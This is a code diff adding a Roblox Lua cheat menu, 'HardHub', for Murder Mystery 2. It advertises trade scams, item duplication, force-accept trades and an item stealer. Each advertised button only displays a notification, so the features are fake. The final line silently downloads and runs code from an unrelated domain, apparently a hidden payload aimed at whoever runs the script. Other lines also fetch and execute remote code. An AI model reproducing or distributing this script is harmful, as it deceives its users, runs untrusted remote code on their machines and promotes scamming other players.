@@ -1,0 +1,192 @@
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Script Loaded";
+        Text = "Enjoy!";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 15;
+
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "HardHub";
+        Text = "by zflixy_";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 15;
+
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/slf0Dev/Ocerium_Project/main/Library.lua"))()
+
+Window = Library.Main("Hard Hub","LeftAlt") -- change "LeftAlt" to key that you want will hide gui
+
+
+--//tab
+local Tab = Window.NewTab("⚠️ READ 📚")
+
+
+--//section
+local Section = Tab.NewSection("if the script don't work, wait 4 hours and run it again *until it works*")
+
+
+--//section
+local Section = Tab.NewSection("• PRESS LeftAlt to Hide/Unhide script")
+
+
+--//section
+local Section = Tab.NewSection("• 100% Made By zflixy_ (Discord)")
+
+
+--//section
+local Section = Tab.NewSection("• JOIN DISCORD! .gg/exwwQM4kcu")
+
+
+--//section
+local Section = Tab.NewSection("• TRADE SCAM DON'T WORK IF BYPASS NOT ACTIVE")
+
+
+--//section
+local Section = Tab.NewSection("• WAIT 1 MINUTE FOR BYPASS WORKS 100%")
+
+
+--//section
+local Section = Tab.NewSection("• IF U CLICK ANYTHING ELSE DURING BYPASS U WILL FREEZE")
+
+
+--//tab
+local Tab = Window.NewTab("🟢 Bypass")
+
+
+--//section
+local Section = Tab.NewSection("⚠️ BYPASS IS MANDATORY ⚠️")
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("🔒 Bypass MM2",function(bool)
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "✅ Bypass Activated";
+        Text = "⏳ 2 Minutes Left";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end,false) --"true" is the default value of toggle
+
+
+--//tab
+local Tab = Window.NewTab("🟢 Dupe")
+
+
+--//section
+local Section = Tab.NewSection("⚠️ NEED TO BE ON THE SERVER FOR 4 MINUTES TO DUPE WORK ⚠️")
+
+
+--//section
+local Section = Tab.NewSection("⚠️ DUPE DOESN'T WORK ON PRIV SERVERS ⚠️")
+
+
+--// Button
+local Button = Section.NewButton("🔪 Dupe Knifes",function()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "✅ Duping Knifes..";
+        Text = "⏳ 4 Minutes Left";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end)
+
+
+--// Button
+local Button = Section.NewButton("🔫 Dupe Guns",function()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "✅ Duping Guns..";
+        Text = "⏳ 4 Minutes Left";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end)
+
+
+--// Button
+local Button = Section.NewButton("🐕 Dupe Pets",function()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "✅ Duping Pets..";
+        Text = "⏳ 4 Minutes Left";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end)
+
+
+--// Button
+local Button = Section.NewButton("💎 Dupe Coins and Gems",function()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "❌ Error";
+        Text = "At 100 members in dc";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end)
+
+
+--//tab
+local Tab = Window.NewTab("🟢 Trade Scam")
+
+
+--//section
+local Section = Tab.NewSection("⚠️ NEED TO BE ON THE SERVER FOR 3 MINUTES TO WORK ⚠️")
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("🔥 Trade Scam",function(bool)
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "✅ Scam Activated";
+        Text = "🔥";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end,false) --"true" is the default value of
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("🔥 Trade Scam V2 (PC)",function(bool)
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "✅ Scam V2 Activated";
+        Text = "🔥";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end,false) --"true" is the default value of
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("❄️ Freeze Trade",function(bool)
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "✅ Freeze Activated";
+        Text = "❄️";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end,false) --"true" is the default value of
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("✅ Force Accept Trade",function(bool)
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "✅ Accept Activated";
+        Text = "✅";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 1612;
+end,false) --"true" is the default value of
+
+
+--//tab
+local Tab = Window.NewTab("👮 Item Stealer (OP)")
+
+
+--//section
+local Section = Tab.NewSection("⚠️ RELEASE WHEN MY DISCORD SERVER HIT 100 MEMBERS ⚠️")
+
+
+--//tab
+local Tab = Window.NewTab("🧍 Others")
+
+
+--//section
+local Section = Tab.NewSection("❗❓ Give me ideas in my discord of what to add here")
+
+
+--// Button
+local Button = Section.NewButton("👓 Esp",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))()
+end)
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/5fc19d23653e9fda71cbef38.lua", true))()
